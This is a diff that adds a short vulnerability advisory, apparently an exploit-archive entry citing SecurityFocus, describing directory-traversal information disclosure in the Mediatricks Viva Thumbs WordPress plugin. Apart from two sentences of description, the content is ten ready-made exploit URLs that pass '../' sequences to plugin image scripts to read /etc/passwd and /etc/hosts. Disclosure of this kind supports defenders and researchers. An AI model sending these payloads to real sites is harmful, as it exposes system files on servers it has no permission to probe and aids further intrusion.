@@ -1,0 +1,16 @@
+source: http://www.securityfocus.com/bid/45539/info
+
+The Mediatricks Viva Thumbs plugin for WordPress is prone to multiple information-disclosure vulnerabilities because it fails to properly sanitize user-supplied input.
+
+Attackers can exploit these issues using directory-traversal strings to confirm the existence of local files outside of the WordPress webroot. Information obtained can aid in launching further attacks. 
+
+http://www.example.com/show_image_NpAdvCatPG.php?cache=false&cat=1&filename=/../../../../../../etc/passwd
+http://www.example.com/show_image_NpAdvHover.php?cache=false&cat=0&filename=/../../../../../../etc/passwd
+http://www.example.com/show_image_NpAdvInnerSmall.php?cache=false&cat=1&filename=/../../../../../../etc/hosts
+http://www.example.com/show_image_NpAdvMainFea.php?cache=false&cat=1&filename=/../../../../../../etc/passwd
+http://www.example.com/show_image_NpAdvMainPGThumb.php?cache=false&cat=1&filename=/../../../../../../etc/hosts
+http://www.example.com/show_image_NpAdvFeaThumb.php?cache=false&cat=1&filename=/../../../../../../etc/hosts
+http://www.example.com/show_image_NpAdvSecondaryRight.php?cache=false&cat=1&filename=/../../../../../../etc/hosts
+http://www.example.com/show_image_NpAdvSideFea.php?cache=false&cat=1&filename=/../../../../../../etc/hosts
+http://www.example.com/show_image_NpAdvSinglePhoto.php?cache=false&cat=1&filename=/../../../../../../etc/hosts
+http://www.example.com/show_image_NpAdvSubFea.php?cache=false&cat=1&filename=/../../../../../../etc/hosts 
